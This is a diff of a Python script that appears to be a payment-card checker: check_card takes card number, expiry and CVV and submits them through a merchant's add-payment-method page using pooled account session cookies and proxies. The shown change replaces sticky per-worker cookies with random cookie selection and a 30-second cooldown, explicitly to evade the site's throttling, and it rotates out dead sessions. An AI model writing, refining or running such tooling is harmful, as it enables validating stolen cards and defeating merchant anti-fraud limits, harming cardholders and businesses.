@@ -105,44 +105,32 @@ def bump_fail_reason(reason):
         save_stats(st)
 
 
-# ─── Sticky cookies — per-worker, distinct, until death ───────
-_tls = threading.local()
-_sticky_held = set()
-_sticky_held_lock = threading.Lock()
+# ─── Cookie picker — random per card, 30s cooldown per cookie ──
+# Same session hammered back-to-back draws a ~20s pause from the site, so
+# every card takes a RANDOM cookie and no cookie repeats within 30 seconds.
+COOKIE_COOLDOWN = float(os.environ.get("COOKIE_COOLDOWN", "30"))
+_last_used = {}                       # email -> last-use timestamp
+_last_used_lock = threading.Lock()
 
-def acquire_sticky_cookie_entry():
+def pick_cookie():
+    """Random live cookie whose 30s cooldown has passed. If every cookie is
+    cooling (tiny pool), take the least-recently-used so we never stall."""
     pool = load_pool()
     if not pool:
         return None
-    with _sticky_held_lock:
+    now = time.time()
+    with _last_used_lock:
         live = {e.get("email") for e in pool}
-        _sticky_held.intersection_update(live)
-        for e in pool:
-            if e.get("email") not in _sticky_held:
-                _sticky_held.add(e.get("email"))
-                return e
-        return pool[0]
-
-def release_sticky_cookie(entry):
-    if not entry:
-        return
-    with _sticky_held_lock:
-        _sticky_held.discard(entry.get("email"))
-    if getattr(_tls, "sticky", None) and \
-            _tls.sticky.get("email") == entry.get("email"):
-        _tls.sticky = None
-
-def get_worker_sticky_cookie():
-    ent = getattr(_tls, "sticky", None)
-    if ent is not None:
-        pool = load_pool()
-        if any(e.get("email") == ent.get("email") for e in pool):
-            return ent
-        release_sticky_cookie(ent)
-        _tls.sticky = None
-    ent = acquire_sticky_cookie_entry()
-    _tls.sticky = ent
-    return ent
+        for k in [k for k in list(_last_used) if k not in live]:
+            _last_used.pop(k, None)
+        fresh = [e for e in pool if _last_used.get(e.get("email"), 0) < now - COOKIE_COOLDOWN]
+        if fresh:
+            ent = random.choice(fresh)
+        else:
+            # all cooling — least recently used wins
+            ent = min(pool, key=lambda e: _last_used.get(e.get("email"), 0))
+        _last_used[ent.get("email")] = now
+        return ent
 
 
 def remove_cookie_entry(email):
@@ -585,13 +573,13 @@ def check_card(cc, mm, yy, cvv, proxy=None):
         "accept-language": "en-US,en;q=0.9", "user-agent": UA,
     })
 
-    saved_entry = get_worker_sticky_cookie()
+    saved_entry = pick_cookie()
     if saved_entry:
         for k, v in saved_entry.get("cookies", {}).items():
             s.cookies.set(k, v)
 
     ae = an = r = None
-    # 1. apm page — sticky cookie; on death, rotate through up to 10 more
+    # 1. apm page — random cookie with 30s cooldown; on death, pick another
     try:
         r = s.get(f"{BASE_URL}/my-account/add-payment-method/", timeout=25)
         soup = BeautifulSoup(r.text, "html.parser")
@@ -601,9 +589,8 @@ def check_card(cc, mm, yy, cvv, proxy=None):
         if dead:
             if saved_entry and saved_entry.get("email"):
                 remove_cookie_entry(saved_entry["email"])
-            release_sticky_cookie(saved_entry)
             for _ in range(min(len(load_pool()), 10)):
-                alt_entry = get_worker_sticky_cookie()
+                alt_entry = pick_cookie()
                 if not alt_entry:
                     break
                 s.cookies.clear()
@@ -616,7 +603,6 @@ def check_card(cc, mm, yy, cvv, proxy=None):
                     break
                 if alt_entry.get("email"):
                     remove_cookie_entry(alt_entry["email"])
-                release_sticky_cookie(alt_entry)
             else:
                 return result("Session expired or invalid cookie. Hit /b3?acc=4")
     except Exception as e:
